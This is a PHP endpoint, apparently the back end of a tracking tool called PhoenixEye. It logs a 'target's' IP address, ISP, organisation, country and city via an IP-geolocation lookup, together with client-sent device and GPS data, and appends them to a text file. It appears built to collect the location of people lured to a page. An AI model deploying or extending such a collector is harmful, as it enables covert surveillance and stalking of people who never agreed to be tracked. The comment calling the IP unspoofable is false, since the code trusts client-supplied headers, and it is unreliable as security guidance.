<?php
// PhoenixEye - ingest endpoint with server-side IP + ISP

header('Content-Type: text/plain');

// ---- server-observed IP (cannot be spoofed by client) ----
$ip = 'unknown';
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $parts = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    $ip = trim($parts[0]);
} elseif (!empty($_SERVER['REMOTE_ADDR'])) {
    $ip = $_SERVER['REMOTE_ADDR'];
}

// ---- ISP lookup (best effort, silently skipped on failure) ----
$isp = 'Unavailable';
$org = 'Unavailable';
$country = 'Unavailable';
$city    = 'Unavailable';
if (filter_var($ip, FILTER_VALIDATE_IP)) {
    $ctx = stream_context_create([
        'http' => ['timeout' => 4, 'ignore_errors' => true]
    ]);
    $resp = @file_get_contents(
        'http://ip-api.com/json/' . urlencode($ip) . '?fields=status,country,city,isp,org,as',
                               false,
                               $ctx
    );
    if ($resp) {
        $j = json_decode($resp, true);
        if (is_array($j) && ($j['status'] ?? '') === 'success') {
            $isp     = $j['isp']     ?? 'Unavailable';
            $org     = $j['org']     ?? 'Unavailable';
            $country = $j['country'] ?? 'Unavailable';
            $city    = $j['city']    ?? 'Unavailable';
        }
    }
}

// ---- body from client (device + GPS) ----
$raw  = file_get_contents('php://input');
$data = json_decode($raw, true);
$body = is_string($data) ? $data : (is_array($data) ? implode("\n", $data) : (string) $raw);

// ---- compose report ----
$header  = "\nTarget IP Detail\n";
$header .= "----------------\n";
$header .= "IP: "      . $ip      . "\n";
$header .= "ISP: "     . $isp     . "\n";
$header .= "Org: "     . $org     . "\n";
$header .= "Country: " . $country . "\n";
$header .= "City: "    . $city    . "\n";
$header .= "Time: "    . date('c') . "\n";
$header .= "----------------\n";

file_put_contents(
    'phoenix_data.txt',
    $header . $body . "\n",
    FILE_APPEND | LOCK_EX
);

echo "ok";
